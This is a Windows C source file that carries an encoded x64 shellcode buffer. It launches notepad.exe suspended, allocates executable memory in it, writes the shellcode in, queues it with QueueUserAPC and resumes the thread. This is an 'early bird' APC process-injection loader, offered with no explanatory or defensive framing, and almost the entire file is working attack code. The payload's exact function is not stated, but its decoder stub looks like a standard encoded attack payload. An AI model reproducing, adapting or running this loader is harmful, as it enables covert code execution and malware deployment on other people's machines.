#include <stdio.h>
#include <windows.h>

int createProcessF()

{
    unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x1b\x42\xee\xa5\xe3\x5c\x18\x13\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe7\x0a\x6d"
"\x41\x13\xb4\xd8\x13\x1b\x42\xaf\xf4\xa2\x0c\x4a\x42\x4d"
"\x0a\xdf\x77\x86\x14\x93\x41\x7b\x0a\x65\xf7\xfb\x14\x93"
"\x41\x3b\x0a\x65\xd7\xb3\x14\x17\xa4\x51\x08\xa3\x94\x2a"
"\x14\x29\xd3\xb7\x7e\x8f\xd9\xe1\x70\x38\x52\xda\x8b\xe3"
"\xe4\xe2\x9d\xfa\xfe\x49\x03\xbf\xed\x68\x0e\x38\x98\x59"
"\x7e\xa6\xa4\x33\xd7\x98\x9b\x1b\x42\xee\xed\x66\x9c\x6c"
"\x74\x53\x43\x3e\xf5\x68\x14\x00\x57\x90\x02\xce\xec\xe2"
"\x8c\xfb\x45\x53\xbd\x27\xe4\x68\x68\x90\x5b\x1a\x94\xa3"
"\x94\x2a\x14\x29\xd3\xb7\x03\x2f\x6c\xee\x1d\x19\xd2\x23"
"\xa2\x9b\x54\xaf\x5f\x54\x37\x13\x07\xd7\x74\x96\x84\x40"
"\x57\x90\x02\xca\xec\xe2\x8c\x7e\x52\x90\x4e\xa6\xe1\x68"
"\x1c\x04\x5a\x1a\x92\xaf\x2e\xe7\xd4\x50\x12\xcb\x03\xb6"
"\xe4\xbb\x02\x41\x49\x5a\x1a\xaf\xfc\xa2\x06\x50\x90\xf7"
"\x62\xaf\xf7\x1c\xbc\x40\x52\x42\x18\xa6\x2e\xf1\xb5\x4f"
"\xec\xe4\xbd\xb3\xec\x5d\x2b\x6b\x21\x44\x71\xdc\xa5\xe3"
"\x1d\x4e\x5a\x92\xa4\xa6\x24\x0f\xfc\x19\x13\x1b\x0b\x67"
"\x40\xaa\xe0\x1a\x13\x1e\x7b\x2e\x0d\xaf\xdc\x59\x47\x52"
"\xcb\x0a\xe9\x6a\xad\x59\xa9\x57\x35\xc8\xa2\x1c\x89\x54"
"\x9a\xf1\x2a\xef\xa4\xe3\x5c\x41\x52\xa1\x6b\x6e\xce\xe3"
"\xa3\xcd\x43\x4b\x0f\xdf\x6c\xae\x6d\xd8\x5b\xe4\x82\xa6"
"\x2c\x21\x14\xe7\xd3\x53\xcb\x2f\xe4\x59\xb6\x17\xcc\xfb"
"\xbd\x3b\xed\x6a\x9b\x72\x03\x5a\x1a\xa2\x2c\x01\x14\x91"
"\xea\x5a\xf8\x77\x00\x97\x3d\xe7\xc6\x53\xc3\x2a\xe5\xe1"
"\x5c\x18\x5a\xa3\x21\x83\xc1\xe3\x5c\x18\x13\x1b\x03\xbe"
"\xe4\xb3\x14\x91\xf1\x4c\x15\xb9\xe8\xd2\x9c\x72\x1e\x42"
"\x03\xbe\x47\x1f\x3a\xdf\x57\x3f\x16\xef\xa4\xab\xd1\x5c"
"\x37\x03\x84\xee\xcd\xab\xd5\xfe\x45\x4b\x03\xbe\xe4\xb3"
"\x1d\x48\x5a\xe4\x82\xaf\xf5\xaa\xa3\xd0\x5e\x92\x83\xa2"
"\x2c\x22\x1d\xa2\x6a\xd7\x7d\x68\x5a\x36\x14\x29\xc1\x53"
"\xbd\x24\x2e\xed\x1d\xa2\x1b\x9c\x5f\x8e\x5a\x36\xe7\xe8"
"\xa6\xb9\x14\xaf\x1f\x45\xc9\xa5\x8e\xe4\x97\xa6\x26\x27"
"\x74\x24\x15\x67\x48\x6e\x5e\x03\x29\x1d\xa8\x5c\x51\x9c"
"\xca\x89\x5c\x41\x52\x92\x98\x11\x70\xe3\x5c\x18\x13";


    size_t shellcode = sizeof(buf);
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};

    int createProcess = CreateProcessW(L"C:\\WINDOWS\\system32\\notepad.exe",NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

        if (!createProcess)

        {

            printf("(-) Process creation has failed please try again.\n Error: %ld", GetLastError);

            return EXIT_FAILURE;

        }

        else
        {

            printf("(+) Process was successfully created and started!\n PID: %ld", pi.dwProcessId);

            printf("\n\nProcess with PID:%ld has been started, goodbye.", pi.dwProcessId);

            //return EXIT_SUCCESS;

        }

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    LPVOID shelladdress = VirtualAllocEx(hProcess, NULL, shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shelladdress;

    WriteProcessMemory(hProcess, shelladdress, buf, shellcode, NULL);
    QueueUserAPC((PAPCFUNC)shelladdress, hThread, (ULONG_PTR)0);
    ResumeThread(hThread);

    return 0;

}

int main()

{

printf("Starting notepad.exe as a new process...\n\n");

createProcessF();

}
